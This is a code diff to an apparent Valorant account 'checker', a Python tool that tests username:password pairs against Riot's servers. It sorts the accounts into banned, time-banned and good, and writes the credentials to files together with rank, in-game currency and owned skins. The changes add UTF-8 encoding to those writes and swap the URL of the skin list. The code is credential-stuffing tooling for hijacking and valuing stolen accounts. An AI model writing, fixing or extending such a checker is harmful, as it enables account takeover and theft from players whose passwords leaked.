@@ -167,7 +167,7 @@ def checker():
                 typebanned = x['type']
             if typebanned == "PERMANENT_BAN":
                 result_s1 = "Permantent"
-                bannedtxt = open("results//ban.txt", "a+")
+                bannedtxt = open("results//ban.txt", "a+", encoding='utf-8')
                 bannedtxt.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Banntype: {typebanned}\n| Expire {result_s1}\n| Creattion: {result_s}\n|[-------------------------------------]\n\n")
                 bannedtxt.close()
                 if choice == 2:
@@ -184,7 +184,7 @@ def checker():
                 unix_time1 = int(unix_time1)
                 result_s1 = pandas.to_datetime(unix_time1,unit='ms')
                 str(result_s1)
-                bannedtxt1 = open("results//timeban.txt", "a+")
+                bannedtxt1 = open("results//timeban.txt", "a+", encoding='utf-8')
                 bannedtxt1.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Banntype: {typebanned}\n| Expire {result_s1}\n| Creattion: {result_s}\n|[-------------------------------------]\n\n")
                 bannedtxt1.close()
                 if choice == 2:
@@ -196,7 +196,7 @@ def checker():
 
             elif typebanned == "unbann":
                 if choice == 2:
-                    bannedtxt12 = open("results//good.txt", "a+")
+                    bannedtxt12 = open("results//good.txt", "a+", encoding='utf-8')
                     bannedtxt12.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Banntype: {typebanned}\n| Email Verified: {EmailVerified}\n| Creation: {result_s}\n[-------------------------------------]\n\n")
                     bannedtxt12.close()
                     if choice == 2:
@@ -205,7 +205,7 @@ def checker():
                     continue
             else:
                 if choice == 2:
-                    bannedtxt12 = open("results//good.txt", "a+")
+                    bannedtxt12 = open("results//good.txt", "a+", encoding='utf-8')
                     bannedtxt12.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Banntype: {typebanned}\n| Email Verified: {EmailVerified}\n| Creation: {result_s}\n[-------------------------------------]\n\n")
                     if choice == 2:
                         print(f"{Fore.GREEN}[Good]{Fore.RESET} {username}:{password} Type: {typebanned}")
@@ -215,7 +215,7 @@ def checker():
             if choice == 2:
                 if typebanned == None:
                     typebanned = "Unbanned"
-                    bannedtxt12 = open("results//good.txt", "a+")
+                    bannedtxt12 = open("results//good.txt", "a+", encoding='utf-8')
                     bannedtxt12.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Banntype: {typebanned}\n| Email Verified: {EmailVerified}\n| Creation: {result_s}\n[-------------------------------------]\n\n")
                     bannedtxt12.close()
                     if choice == 2:
@@ -310,7 +310,7 @@ def checker():
 
     #get Skins
             r = requests.get(f"https://pd.{Region}.a.pvp.net/store/v1/entitlements/{Sub}/e7c63390-eda7-46e0-bb7a-a6abdacd2433",headers=headers)
-            response_API = requests.get('https://raw.githubusercontent.com/CSTCryst/Skin-Api/main/SkinList')
+            response_API = requests.get('https://raw.githubusercontent.com/xharky/Valorant-list/main/Skinlist.txt')
             response = response_API.text
             skinsList = response.splitlines()
             userSkins = []
@@ -331,7 +331,7 @@ def checker():
 
             if typebanned == None:
                 typebanned = "Unbanned"
-                bannedtxt12 = open("results//fullcapture.txt", "a+")
+                bannedtxt12 = open("results//fullcapture.txt", "a+", encoding='utf-8')
                 bannedtxt12.write(f"[--------------[Valorant]--------------]\n| User&Pass: {username}:{password}\n| Banntype: {typebanned}\n| Last Game: {last_time}\n| Region: {Region}\n| Level: {AccountLevel}\n| Email Verified: {EmailVerified}\n| Creation: {result_s}\n| Rank: {Rank}\n| VP: {ValorantPoints} - RP: {Radianite}\n|-------------[Skins({len(userSkins)})]-------------]\n{SkinStr}[------------------------------------]\n\n")
                 bannedtxt12.close()
                 if choice == 3:
